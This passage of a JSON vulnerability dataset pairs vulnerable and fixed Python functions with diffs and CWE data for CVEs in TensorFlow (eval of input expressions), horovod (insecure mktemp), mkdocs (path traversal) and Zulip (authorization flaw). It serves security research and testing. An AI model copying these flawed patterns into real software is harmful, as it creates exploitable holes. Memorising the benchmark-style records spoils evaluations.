tensor.\n        When loading from a pickle file, if no variable_name is specified in the\n        square brackets, whatever that is inside the pickle file will be passed\n        to the specified input tensor, else SavedModel CLI will assume a\n        dictionary is stored in the pickle file and the value corresponding to\n        the variable_name will be used.\n    input_exprs_str: A string that specifies python expressions for inputs.\n        * In the format of: '<input_key>=<python expression>'.\n        * numpy module is available as np.\n    input_examples_str: A string that specifies tf.Example with dictionary.\n        * In the format of: '<input_key>=<[{feature:value list}]>'\n\n  Returns:\n    A dictionary that maps input tensor keys to numpy ndarrays.\n\n  Raises:\n    RuntimeError: An error when a key is specified, but the input file contains\n        multiple numpy ndarrays, none of which matches the given key.\n    RuntimeError: An error when no key is specified, but the input file contains\n        more than one numpy ndarrays.\n  \"\"\"\n  tensor_key_feed_dict = {}\n\n  inputs = preprocess_inputs_arg_string(inputs_str)\n  input_exprs = preprocess_input_exprs_arg_string(input_exprs_str)\n  input_examples = preprocess_input_examples_arg_string(input_examples_str)\n\n  for input_tensor_key, (filename, variable_name) in inputs.items():\n    data = np.load(file_io.FileIO(filename, mode='rb'), allow_pickle=True)  # pylint: disable=unexpected-keyword-arg\n\n    # When a variable_name key is specified for the input file\n    if variable_name:\n      # if file contains a single ndarray, ignore the input name\n      if isinstance(data, np.ndarray):\n        logging.warn(\n            'Input file %s contains a single ndarray. Name key \\\"%s\\\" ignored.'\n            % (filename, variable_name))\n        tensor_key_feed_dict[input_tensor_key] = data\n      else:\n        if variable_name in data:\n          tensor_key_feed_dict[input_tensor_key] = data[variable_name]\n        else:\n          raise RuntimeError(\n              'Input file %s does not contain variable with name \\\"%s\\\".' %\n              (filename, variable_name))\n    # When no key is specified for the input file.\n    else:\n      # Check if npz file only contains a single numpy ndarray.\n      if isinstance(data, np.lib.npyio.NpzFile):\n        variable_name_list = data.files\n        if len(variable_name_list) != 1:\n          raise RuntimeError(\n              'Input file %s contains more than one ndarrays. Please specify '\n              'the name of ndarray to use.' % filename)\n        tensor_key_feed_dict[input_tensor_key] = data[variable_name_list[0]]\n      else:\n        tensor_key_feed_dict[input_tensor_key] = data\n\n  # When input is a python expression:\n  for input_tensor_key, py_expr_evaluated in input_exprs.items():\n    if input_tensor_key in tensor_key_feed_dict:\n      logging.warn(\n          'input_key %s has been specified with both --inputs and --input_exprs'\n          ' options. Value in --input_exprs will be used.' % input_tensor_key)\n    tensor_key_feed_dict[input_tensor_key] = py_expr_evaluated\n\n  # When input is a tf.Example:\n  for input_tensor_key, example in input_examples.items():\n    if input_tensor_key in tensor_key_feed_dict:\n      logging.warn(\n          'input_key %s has been specified in multiple options. Value in '\n          '--input_examples will be used.' % input_tensor_key)\n    tensor_key_feed_dict[input_tensor_key] = example\n  return tensor_key_feed_dict"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_174_1",
        "commit": "8b202f0",
        "file_path": "tensorflow/python/tools/saved_model_cli.py",
        "start_line": 525,
        "end_line": 560,
        "snippet": "def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):\n  \"\"\"Parses input arg into dictionary that maps input key to python expression.\n\n  Parses input string in the format of 'input_key=<python expression>' into a\n  dictionary that maps each input_key to its python expression.\n\n  Args:\n    input_exprs_str: A string that specifies python expression for input keys.\n      Each input is separated by semicolon. For each input key:\n        'input_key=<python expression>'\n    safe: Whether to evaluate the python expression as literals or allow\n      arbitrary calls (e.g. numpy usage).\n\n  Returns:\n    A dictionary that maps input keys to their values.\n\n  Raises:\n    RuntimeError: An error when the given input string is in a bad format.\n  \"\"\"\n  input_dict = {}\n\n  for input_raw in filter(bool, input_exprs_str.split(';')):\n    if '=' not in input_exprs_str:\n      raise RuntimeError('--input_exprs \"%s\" format is incorrect. Please follow'\n                         '\"<input_key>=<python expression>\"' % input_exprs_str)\n    input_key, expr = input_raw.split('=', 1)\n    if safe:\n      try:\n        input_dict[input_key] = ast.literal_eval(expr)\n      except:\n        raise RuntimeError(\n            f'Expression \"{expr}\" is not a valid python literal.')\n    else:\n      # ast.literal_eval does not work with numpy expressions\n      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n  return input_dict"
      },
      {
        "id": "fix_py_174_2",
        "commit": "8b202f0",
        "file_path": "tensorflow/python/tools/saved_model_cli.py",
        "start_line": 621,
        "end_line": 721,
        "snippet": "def load_inputs_from_input_arg_string(inputs_str, input_exprs_str,\n                                      input_examples_str):\n  \"\"\"Parses input arg strings and create inputs feed_dict.\n\n  Parses '--inputs' string for inputs to be loaded from file, and parses\n  '--input_exprs' string for inputs to be evaluated from python expression.\n  '--input_examples' string for inputs to be created from tf.example feature\n  dictionary list.\n\n  Args:\n    inputs_str: A string that specified where to load inputs. Each input is\n        separated by semicolon.\n        * For each input key:\n            '<input_key>=<filename>' or\n            '<input_key>=<filename>[<variable_name>]'\n        * The optional 'variable_name' key will be set to None if not specified.\n        * File specified by 'filename' will be loaded using numpy.load. Inputs\n            can be loaded from only .npy, .npz or pickle files.\n        * The \"[variable_name]\" key is optional depending on the input file type\n            as descripted in more details below.\n        When loading from a npy file, which always contains a numpy ndarray, the\n        content will be directly assigned to the specified input tensor. If a\n        variable_name is specified, it will be ignored and a warning will be\n        issued.\n        When loading from a npz zip file, user can specify which variable within\n        the zip file to load for the input tensor inside the square brackets. If\n        nothing is specified, this function will check that only one file is\n        included in the zip and load it for the specified input tensor.\n        When loading from a pickle file, if no variable_name is specified in the\n        square brackets, whatever that is inside the pickle file will be passed\n        to the specified input tensor, else SavedModel CLI will assume a\n        dictionary is stored in the pickle file and the value corresponding to\n        the variable_name will be used.\n    input_exprs_str: A string that specifies python expressions for inputs.\n        * In the format of: '<input_key>=<python expression>'.\n        * numpy module is available as np.\n    input_examples_str: A string that specifies tf.Example with dictionary.\n        * In the format of: '<input_key>=<[{feature:value list}]>'\n\n  Returns:\n    A dictionary that maps input tensor keys to numpy ndarrays.\n\n  Raises:\n    RuntimeError: An error when a key is specified, but the input file contains\n        multiple numpy ndarrays, none of which matches the given key.\n    RuntimeError: An error when no key is specified, but the input file contains\n        more than one numpy ndarrays.\n  \"\"\"\n  tensor_key_feed_dict = {}\n\n  inputs = preprocess_inputs_arg_string(inputs_str)\n  input_exprs = preprocess_input_exprs_arg_string(input_exprs_str, safe=False)\n  input_examples = preprocess_input_examples_arg_string(input_examples_str)\n\n  for input_tensor_key, (filename, variable_name) in inputs.items():\n    data = np.load(file_io.FileIO(filename, mode='rb'), allow_pickle=True)  # pylint: disable=unexpected-keyword-arg\n\n    # When a variable_name key is specified for the input file\n    if variable_name:\n      # if file contains a single ndarray, ignore the input name\n      if isinstance(data, np.ndarray):\n        logging.warn(\n            'Input file %s contains a single ndarray. Name key \\\"%s\\\" ignored.'\n            % (filename, variable_name))\n        tensor_key_feed_dict[input_tensor_key] = data\n      else:\n        if variable_name in data:\n          tensor_key_feed_dict[input_tensor_key] = data[variable_name]\n        else:\n          raise RuntimeError(\n              'Input file %s does not contain variable with name \\\"%s\\\".' %\n              (filename, variable_name))\n    # When no key is specified for the input file.\n    else:\n      # Check if npz file only contains a single numpy ndarray.\n      if isinstance(data, np.lib.npyio.NpzFile):\n        variable_name_list = data.files\n        if len(variable_name_list) != 1:\n          raise RuntimeError(\n              'Input file %s contains more than one ndarrays. Please specify '\n              'the name of ndarray to use.' % filename)\n        tensor_key_feed_dict[input_tensor_key] = data[variable_name_list[0]]\n      else:\n        tensor_key_feed_dict[input_tensor_key] = data\n\n  # When input is a python expression:\n  for input_tensor_key, py_expr_evaluated in input_exprs.items():\n    if input_tensor_key in tensor_key_feed_dict:\n      logging.warn(\n          'input_key %s has been specified with both --inputs and --input_exprs'\n          ' options. Value in --input_exprs will be used.' % input_tensor_key)\n    tensor_key_feed_dict[input_tensor_key] = py_expr_evaluated\n\n  # When input is a tf.Example:\n  for input_tensor_key, example in input_examples.items():\n    if input_tensor_key in tensor_key_feed_dict:\n      logging.warn(\n          'input_key %s has been specified in multiple options. Value in '\n          '--input_examples will be used.' % input_tensor_key)\n    tensor_key_feed_dict[input_tensor_key] = example\n  return tensor_key_feed_dict"
      }
    ],
    "vul_patch": "--- a/tensorflow/python/tools/saved_model_cli.py\n+++ b/tensorflow/python/tools/saved_model_cli.py\n@@ -1,4 +1,4 @@\n-def preprocess_input_exprs_arg_string(input_exprs_str):\n+def preprocess_input_exprs_arg_string(input_exprs_str, safe=True):\n   \"\"\"Parses input arg into dictionary that maps input key to python expression.\n \n   Parses input string in the format of 'input_key=<python expression>' into a\n@@ -6,8 +6,10 @@\n \n   Args:\n     input_exprs_str: A string that specifies python expression for input keys.\n-    Each input is separated by semicolon. For each input key:\n+      Each input is separated by semicolon. For each input key:\n         'input_key=<python expression>'\n+    safe: Whether to evaluate the python expression as literals or allow\n+      arbitrary calls (e.g. numpy usage).\n \n   Returns:\n     A dictionary that maps input keys to their values.\n@@ -22,6 +24,13 @@\n       raise RuntimeError('--input_exprs \"%s\" format is incorrect. Please follow'\n                          '\"<input_key>=<python expression>\"' % input_exprs_str)\n     input_key, expr = input_raw.split('=', 1)\n-    # ast.literal_eval does not work with numpy expressions\n-    input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n+    if safe:\n+      try:\n+        input_dict[input_key] = ast.literal_eval(expr)\n+      except:\n+        raise RuntimeError(\n+            f'Expression \"{expr}\" is not a valid python literal.')\n+    else:\n+      # ast.literal_eval does not work with numpy expressions\n+      input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n   return input_dict\n\n--- a/tensorflow/python/tools/saved_model_cli.py\n+++ b/tensorflow/python/tools/saved_model_cli.py\n@@ -49,7 +49,7 @@\n   tensor_key_feed_dict = {}\n \n   inputs = preprocess_inputs_arg_string(inputs_str)\n-  input_exprs = preprocess_input_exprs_arg_string(input_exprs_str)\n+  input_exprs = preprocess_input_exprs_arg_string(input_exprs_str, safe=False)\n   input_examples = preprocess_input_examples_arg_string(input_examples_str)\n \n   for input_tensor_key, (filename, variable_name) in inputs.items():\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-0315",
    "cve_description": "Insecure Temporary File in GitHub repository horovod/horovod prior to 0.24.0.",
    "cwe_info": {
      "CWE-668": {
        "name": "Exposure of Resource to Wrong Sphere",
        "description": "The product exposes a resource to the wrong control sphere, providing unintended actors with inappropriate access to the resource."
      }
    },
    "repo": "https://github.com/horovod/horovod",
    "patch_url": [
      "https://github.com/horovod/horovod/commit/b96ecae4dc69fc0a83c7c2d3f1dde600c20a1b41"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_359_1",
        "commit": "655353fc345b6a2512839a5bfc7086a5c7c614cf",
        "file_path": "horovod/runner/js_run.py",
        "start_line": 96,
        "end_line": 146,
        "snippet": "def generate_jsrun_rankfile(settings, path=None):\n    \"\"\"\n    Generates rankfile to use with jsrun.\n    It splits the cores among the processes, which leads to best performance according to experiments.\n\n    Args:\n        settings: Settings for running jsrun.\n                  Note: settings.num_proc and settings.hosts must not be None.\n        path: Optional path of the rankfile.\n              Note: this file will be overwritten.\n    \"\"\"\n    cpu_per_gpu = (lsf.LSFUtils.get_num_cores() * lsf.LSFUtils.get_num_threads()) // lsf.LSFUtils.get_num_gpus()\n    host_list = (x.split(':') for x in settings.hosts.split(','))\n\n    # Verify and truncate host list if necessary\n    validated_list = []\n    remaining_slots = settings.num_proc\n    for host, slots in host_list:\n        slots = int(slots)\n        if slots > lsf.LSFUtils.get_num_gpus():\n            raise ValueError('Invalid host input, slot count for host \\'{host}:{slots}\\' is greater '\n                             'than number of GPUs per host \\'{gpus}\\'.'.format(\n                host=host, slots=slots, gpus=lsf.LSFUtils.get_num_gpus()))\n        needed_slots = min(slots, remaining_slots)\n        validated_list.append((host, needed_slots))\n        remaining_slots -= needed_slots\n        if remaining_slots == 0:\n            break\n    if remaining_slots != 0:\n        raise ValueError('Not enough slots on the hosts to fulfill the {slots} requested.'.format(\n            slots=settings.num_proc))\n\n    # Generate rankfile\n    path = tempfile.mktemp() if path is None else path\n    with open(path, 'w') as tmp:\n        tmp.write('overlapping_rs: allow\\n')\n        tmp.write('cpu_index_using: logical\\n')\n        rank = 0\n        for host, slots in validated_list:\n            cpu_val = 0\n            tmp.write('\\n')\n            for s in range(slots):\n                tmp.write('rank: {rank}: {{ hostname: {host}; cpu: {{{scpu}-{ecpu}}} ; gpu: * ; mem: * }}\\n'.format(\n                    rank=rank,\n                    host=host,\n                    scpu=cpu_val,\n                    ecpu=cpu_val + cpu_per_gpu - 1\n                ))\n                rank += 1\n                cpu_val += cpu_per_gpu\n    return path"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_359_1",
        "commit": "b96ecae4dc69fc0a83c7c2d3f1dde600c20a1b41",
        "file_path": "horovod/runner/js_run.py",
        "start_line": 96,
        "end_line": 151,
        "snippet": "def generate_jsrun_rankfile(settings, path=None):\n    \"\"\"\n    Generates rankfile to use with jsrun.\n    It splits the cores among the processes, which leads to best performance according to experiments.\n\n    Args:\n        settings: Settings for running jsrun.\n                  Note: settings.num_proc and settings.hosts must not be None.\n        path: Optional path of the rankfile.\n              Note: this file will be overwritten.\n    \"\"\"\n    cpu_per_gpu = (lsf.LSFUtils.get_num_cores() * lsf.LSFUtils.get_num_threads()) // lsf.LSFUtils.get_num_gpus()\n    host_list = (x.split(':') for x in settings.hosts.split(','))\n\n    # Verify and truncate host list if necessary\n    validated_list = []\n    remaining_slots = settings.num_proc\n    for host, slots in host_list:\n        slots = int(slots)\n        if slots > lsf.LSFUtils.get_num_gpus():\n            raise ValueError('Invalid host input, slot count for host \\'{host}:{slots}\\' is greater '\n                             'than number of GPUs per host \\'{gpus}\\'.'.format(\n                host=host, slots=slots, gpus=lsf.LSFUtils.get_num_gpus()))\n        needed_slots = min(slots, remaining_slots)\n        validated_list.append((host, needed_slots))\n        remaining_slots -= needed_slots\n        if remaining_slots == 0:\n            break\n    if remaining_slots != 0:\n        raise ValueError('Not enough slots on the hosts to fulfill the {slots} requested.'.format(\n            slots=settings.num_proc))\n\n    # Generate rankfile\n    # using mkstemp here instead of insecure mktemp.\n    # note that the caller is responsible for cleaning up this file\n    if path is None:\n        fd, path = tempfile.mkstemp()\n        fd.close()\n\n    with open(path, 'w') as tmp:\n        tmp.write('overlapping_rs: allow\\n')\n        tmp.write('cpu_index_using: logical\\n')\n        rank = 0\n        for host, slots in validated_list:\n            cpu_val = 0\n            tmp.write('\\n')\n            for s in range(slots):\n                tmp.write('rank: {rank}: {{ hostname: {host}; cpu: {{{scpu}-{ecpu}}} ; gpu: * ; mem: * }}\\n'.format(\n                    rank=rank,\n                    host=host,\n                    scpu=cpu_val,\n                    ecpu=cpu_val + cpu_per_gpu - 1\n                ))\n                rank += 1\n                cpu_val += cpu_per_gpu\n    return path"
      }
    ],
    "vul_patch": "--- a/horovod/runner/js_run.py\n+++ b/horovod/runner/js_run.py\n@@ -31,7 +31,12 @@\n             slots=settings.num_proc))\n \n     # Generate rankfile\n-    path = tempfile.mktemp() if path is None else path\n+    # using mkstemp here instead of insecure mktemp.\n+    # note that the caller is responsible for cleaning up this file\n+    if path is None:\n+        fd, path = tempfile.mkstemp()\n+        fd.close()\n+\n     with open(path, 'w') as tmp:\n         tmp.write('overlapping_rs: allow\\n')\n         tmp.write('cpu_index_using: logical\\n')\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-40978",
    "cve_description": "The mkdocs 1.2.2 built-in dev-server allows directory traversal using the port 8000, enabling remote exploitation to obtain :sensitive information. NOTE: the vendor has disputed this as described in https://github.com/mkdocs/mkdocs/issues/2601.] and https://github.com/nisdn/CVE-2021-40978/issues/1",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/mkdocs/mkdocs",
    "patch_url": [
      "https://github.com/mkdocs/mkdocs/commit/1b15412f4caae476c262210315fd068d0521a833",
      "https://github.com/mkdocs/mkdocs/commit/57540911a0d632674dd23edec765189f96f84f6b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_137_1",
        "commit": "e0ba6d7",
        "file_path": "mkdocs/livereload/__init__.py",
        "start_line": 162,
        "end_line": 219,
        "snippet": "    def _serve_request(self, environ, start_response):\n        # https://bugs.python.org/issue16679\n        # https://github.com/bottlepy/bottle/blob/f9b1849db4/bottle.py#L984\n        path = environ[\"PATH_INFO\"].encode(\"latin-1\").decode(\"utf-8\", \"ignore\")\n\n        m = re.fullmatch(r\"/livereload/([0-9]+)/[0-9]+\", path)\n        if m:\n            epoch = int(m[1])\n            start_response(\"200 OK\", [(\"Content-Type\", \"text/plain\")])\n\n            def condition():\n                return self._visible_epoch > epoch\n\n            with self._epoch_cond:\n                if not condition():\n                    # Stall the browser, respond as soon as there's something new.\n                    # If there's not, respond anyway after a minute.\n                    self._log_poll_request(environ.get(\"HTTP_REFERER\"), request_id=path)\n                    self._epoch_cond.wait_for(condition, timeout=self.poll_response_timeout)\n                return [b\"%d\" % self._visible_epoch]\n\n        if path == \"/js/livereload.js\":\n            file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), \"livereload.js\")\n        elif path.startswith(self.mount_path):\n            if path.endswith(\"/\"):\n                path += \"index.html\"\n            path = path[len(self.mount_path):]\n            file_path = os.path.join(self.root, path.lstrip(\"/\"))\n        elif path == \"/\":\n            start_response(\"302 Found\", [(\"Location\", self.mount_path)])\n            return []\n        else:\n            return None  # Not found\n\n        # Wait until the ongoing rebuild (if any) finishes, so we're not serving a half-built site.\n        with self._epoch_cond:\n            self._epoch_cond.wait_for(lambda: self._visible_epoch == self._wanted_epoch)\n            epoch = self._visible_epoch\n\n        try:\n            file = open(file_path, \"rb\")\n        except OSError:\n            return None  # Not found\n\n        if path.endswith(\".html\"):\n            with file:\n                content = file.read()\n            content = self._inject_js_into_html(content, epoch)\n            file = io.BytesIO(content)\n            content_length = len(content)\n        else:\n            content_length = os.path.getsize(file_path)\n\n        content_type = self._guess_type(file_path)\n        start_response(\n            \"200 OK\", [(\"Content-Type\", content_type), (\"Content-Length\", str(content_length))]\n        )\n        return wsgiref.util.FileWrapper(file)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_137_1",
        "commit": "1b15412",
        "file_path": "mkdocs/livereload/__init__.py",
        "start_line": 162,
        "end_line": 222,
        "snippet": "    def _serve_request(self, environ, start_response):\n        # https://bugs.python.org/issue16679\n        # https://github.com/bottlepy/bottle/blob/f9b1849db4/bottle.py#L984\n        path = environ[\"PATH_INFO\"].encode(\"latin-1\").decode(\"utf-8\", \"ignore\")\n\n        m = re.fullmatch(r\"/livereload/([0-9]+)/[0-9]+\", path)\n        if m:\n            epoch = int(m[1])\n            start_response(\"200 OK\", [(\"Content-Type\", \"text/plain\")])\n\n            def condition():\n                return self._visible_epoch > epoch\n\n            with self._epoch_cond:\n                if not condition():\n                    # Stall the browser, respond as soon as there's something new.\n                    # If there's not, respond anyway after a minute.\n                    self._log_poll_request(environ.get(\"HTTP_REFERER\"), request_id=path)\n                    self._epoch_cond.wait_for(condition, timeout=self.poll_response_timeout)\n                return [b\"%d\" % self._visible_epoch]\n\n        if path == \"/js/livereload.js\":\n            file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), \"livereload.js\")\n        elif path.startswith(self.mount_path):\n            rel_file_path = path[len(self.mount_path):].lstrip(\"/\")\n            if path.endswith(\"/\"):\n                rel_file_path += \"index.html\"\n            file_path = os.path.join(self.root, rel_file_path)\n        elif path == \"/\":\n            start_response(\"302 Found\", [(\"Location\", self.mount_path)])\n            return []\n        else:\n            return None  # Not found\n\n        # Wait until the ongoing rebuild (if any) finishes, so we're not serving a half-built site.\n        with self._epoch_cond:\n            self._epoch_cond.wait_for(lambda: self._visible_epoch == self._wanted_epoch)\n            epoch = self._visible_epoch\n\n        try:\n            file = open(file_path, \"rb\")\n        except OSError:\n            if not path.endswith(\"/\") and os.path.isfile(os.path.join(file_path, \"index.html\")):\n                start_response(\"302 Found\", [(\"Location\", path + \"/\")])\n                return []\n            return None  # Not found\n\n        if file_path.endswith(\".html\"):\n            with file:\n                content = file.read()\n            content = self._inject_js_into_html(content, epoch)\n            file = io.BytesIO(content)\n            content_length = len(content)\n        else:\n            content_length = os.path.getsize(file_path)\n\n        content_type = self._guess_type(file_path)\n        start_response(\n            \"200 OK\", [(\"Content-Type\", content_type), (\"Content-Length\", str(content_length))]\n        )\n        return wsgiref.util.FileWrapper(file)"
      }
    ],
    "vul_patch": "--- a/mkdocs/livereload/__init__.py\n+++ b/mkdocs/livereload/__init__.py\n@@ -22,10 +22,10 @@\n         if path == \"/js/livereload.js\":\n             file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), \"livereload.js\")\n         elif path.startswith(self.mount_path):\n+            rel_file_path = path[len(self.mount_path):].lstrip(\"/\")\n             if path.endswith(\"/\"):\n-                path += \"index.html\"\n-            path = path[len(self.mount_path):]\n-            file_path = os.path.join(self.root, path.lstrip(\"/\"))\n+                rel_file_path += \"index.html\"\n+            file_path = os.path.join(self.root, rel_file_path)\n         elif path == \"/\":\n             start_response(\"302 Found\", [(\"Location\", self.mount_path)])\n             return []\n@@ -40,9 +40,12 @@\n         try:\n             file = open(file_path, \"rb\")\n         except OSError:\n+            if not path.endswith(\"/\") and os.path.isfile(os.path.join(file_path, \"index.html\")):\n+                start_response(\"302 Found\", [(\"Location\", path + \"/\")])\n+                return []\n             return None  # Not found\n \n-        if path.endswith(\".html\"):\n+        if file_path.endswith(\".html\"):\n             with file:\n                 content = file.read()\n             content = self._inject_js_into_html(content, epoch)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-31168",
    "cve_description": "Zulip is an open source team chat tool. Due to an incorrect authorization check in Zulip Server 5.4 and earlier, a member of an organization could craft an API call that grants organization administrator privileges to one of their bots. The vulnerability is fixed in Zulip Server 5.5. Members who don\u2019t own any bots, and lack permission to create them, can\u2019t exploit the vulnerability. As a workaround for the vulnerability, an organization administrator can restrict the `Who can create bots` permission to administrators only, and change the ownership of existing bots.",
    "cwe_info": {
      "CWE-285": {
        "name": "Improper Authorization",
        "description": "The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-863": {
        "name": "Incorrect Authorization",
        "description": "The product performs an authorization check when an actor attempts to access a resource or perform an action, but it does not correctly perform the check."
      }
    },
    "repo": "https://github.com/zulip/zulip",
    "patch_url": [
      "https://github.com/zulip/zulip/commit/751b2a03e565e9eb02ffe923b7c24ac73d604034"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_409_1",
        "commit": "ad2ca0e6685f9aa46a1df1495fc08e73b98e1091",
        "file_path": "zerver/views/users.py",
        "start_line": 172,
        "end_line": 231,
        "snippet": "def update_user_backend(\n    request: HttpRequest,\n    user_profile: UserProfile,\n    user_id: int,\n    full_name: Optional[str] = REQ(default=None),\n    role: Optional[int] = REQ(\n        default=None,\n        json_validator=check_int_in(\n            UserProfile.ROLE_TYPES,\n        ),\n    ),\n    profile_data: Optional[List[Dict[str, Optional[Union[int, ProfileDataElementValue]]]]] = REQ(\n        default=None,\n        json_validator=check_profile_data,\n    ),\n) -> HttpResponse:\n    target = access_user_by_id(\n        user_profile, user_id, allow_deactivated=True, allow_bots=True, for_admin=True\n    )\n\n    if role is not None and target.role != role:\n        # Require that the current user has permissions to\n        # grant/remove the role in question.  access_user_by_id has\n        # already verified we're an administrator; here we enforce\n        # that only owners can toggle the is_realm_owner flag.\n        #\n        # Logic replicated in patch_bot_backend.\n        if UserProfile.ROLE_REALM_OWNER in [role, target.role] and not user_profile.is_realm_owner:\n            raise OrganizationOwnerRequired()\n\n        if target.role == UserProfile.ROLE_REALM_OWNER and check_last_owner(target):\n            raise JsonableError(\n                _(\"The owner permission cannot be removed from the only organization owner.\")\n            )\n        do_change_user_role(target, role, acting_user=user_profile)\n\n    if full_name is not None and target.full_name != full_name and full_name.strip() != \"\":\n        # We don't respect `name_changes_disabled` here because the request\n        # is on behalf of the administrator.\n        check_change_full_name(target, full_name, user_profile)\n\n    if profile_data is not None:\n        clean_profile_data: List[ProfileDataElementUpdateDict] = []\n        for entry in profile_data:\n            assert isinstance(entry[\"id\"], int)\n            assert not isinstance(entry[\"value\"], int)\n            if entry[\"value\"] is None or not entry[\"value\"]:\n                field_id = entry[\"id\"]\n                check_remove_custom_profile_field_value(target, field_id)\n            else:\n                clean_profile_data.append(\n                    {\n                        \"id\": entry[\"id\"],\n                        \"value\": entry[\"value\"],\n                    }\n                )\n        validate_user_custom_profile_data(target.realm.id, clean_profile_data)\n        do_update_user_custom_profile_data_if_changed(target, clean_profile_data)\n\n    return json_success(request)"
      },
      {
        "id": "vul_py_409_2",
        "commit": "ad2ca0e6685f9aa46a1df1495fc08e73b98e1091",
        "file_path": "zerver/views/users.py",
        "start_line": 304,
        "end_line": 404,
        "snippet": "def patch_bot_backend(\n    request: HttpRequest,\n    user_profile: UserProfile,\n    bot_id: int,\n    full_name: Optional[str] = REQ(default=None),\n    role: Optional[int] = REQ(\n        default=None,\n        json_validator=check_int_in(\n            UserProfile.ROLE_TYPES,\n        ),\n    ),\n    bot_owner_id: Optional[int] = REQ(json_validator=check_int, default=None),\n    config_data: Optional[Dict[str, str]] = REQ(\n        default=None, json_validator=check_dict(value_validator=check_string)\n    ),\n    service_payload_url: Optional[str] = REQ(json_validator=check_url, default=None),\n    service_interface: int = REQ(json_validator=check_int, default=1),\n    default_sending_stream: Optional[str] = REQ(default=None),\n    default_events_register_stream: Optional[str] = REQ(default=None),\n    default_all_public_streams: Optional[bool] = REQ(default=None, json_validator=check_bool),\n) -> HttpResponse:\n    bot = access_bot_by_id(user_profile, bot_id)\n\n    if full_name is not None:\n        check_change_bot_full_name(bot, full_name, user_profile)\n\n    if role is not None and bot.role != role:\n        # Logic duplicated from update_user_backend.\n        if UserProfile.ROLE_REALM_OWNER in [role, bot.role] and not user_profile.is_realm_owner:\n            raise OrganizationOwnerRequired()\n\n        do_change_user_role(bot, role, acting_user=user_profile)\n\n    if bot_owner_id is not None:\n        try:\n            owner = get_user_profile_by_id_in_realm(bot_owner_id, user_profile.realm)\n        except UserProfile.DoesNotExist:\n            raise JsonableError(_(\"Failed to change owner, no such user\"))\n        if not owner.is_active:\n            raise JsonableError(_(\"Failed to change owner, user is deactivated\"))\n        if owner.is_bot:\n            raise JsonableError(_(\"Failed to change owner, bots can't own other bots\"))\n\n        previous_owner = bot.bot_owner\n        if previous_owner != owner:\n            do_change_bot_owner(bot, owner, user_profile)\n\n    if default_sending_stream is not None:\n        if default_sending_stream == \"\":\n            stream: Optional[Stream] = None\n        else:\n            (stream, sub) = access_stream_by_name(user_profile, default_sending_stream)\n        do_change_default_sending_stream(bot, stream, acting_user=user_profile)\n    if default_events_register_stream is not None:\n        if default_events_register_stream == \"\":\n            stream = None\n        else:\n            (stream, sub) = access_stream_by_name(user_profile, default_events_register_stream)\n        do_change_default_events_register_stream(bot, stream, acting_user=user_profile)\n    if default_all_public_streams is not None:\n        do_change_default_all_public_streams(\n            bot, default_all_public_streams, acting_user=user_profile\n        )\n\n    if service_payload_url is not None:\n        check_valid_interface_type(service_interface)\n        assert service_interface is not None\n        do_update_outgoing_webhook_service(bot, service_interface, service_payload_url)\n\n    if config_data is not None:\n        do_update_bot_config_data(bot, config_data)\n\n    if len(request.FILES) == 0:\n        pass\n    elif len(request.FILES) == 1:\n        user_file = list(request.FILES.values())[0]\n        assert isinstance(user_file, UploadedFile)\n        assert user_file.size is not None\n        upload_avatar_image(user_file, user_profile, bot)\n        avatar_source = UserProfile.AVATAR_FROM_USER\n        do_change_avatar_fields(bot, avatar_source, acting_user=user_profile)\n    else:\n        raise JsonableError(_(\"You may only upload one file at a time\"))\n\n    json_result = dict(\n        full_name=bot.full_name,\n        avatar_url=avatar_url(bot),\n        service_interface=service_interface,\n        service_payload_url=service_payload_url,\n        config_data=config_data,\n        default_sending_stream=get_stream_name(bot.default_sending_stream),\n        default_events_register_stream=get_stream_name(bot.default_events_register_stream),\n        default_all_public_streams=bot.default_all_public_streams,\n    )\n\n    # Don't include the bot owner in case it is not set.\n    # Default bots have no owner.\n    if bot.bot_owner is not None:\n        json_result[\"bot_owner\"] = bot.bot_owner.email\n\n    return json_success(request, data=json_result)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_409_1",
        "commit": "751b2a03e565e9eb02ffe923b7c24ac73d604034",
        "file_path": "zerver/views/users.py",
        "start_line": 173,
        "end_line": 232,
